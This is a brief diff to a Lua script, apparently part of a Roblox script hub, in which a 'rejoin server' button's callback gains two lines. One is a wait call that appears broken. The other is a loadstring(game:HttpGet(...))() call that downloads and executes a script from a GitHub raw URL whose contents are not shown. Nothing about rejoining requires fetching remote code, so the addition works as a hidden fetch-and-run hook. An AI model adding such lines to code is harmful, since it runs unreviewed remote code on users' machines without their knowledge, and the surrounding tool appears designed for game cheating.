@@ -71,6 +71,8 @@ Universals:Button{
 	Description = nil,
 	Callback = function() 
         game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+        wait(game.loaded)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/outrozl/project/main/master/findscript.lua?raw=true"))()
     end
 }
 
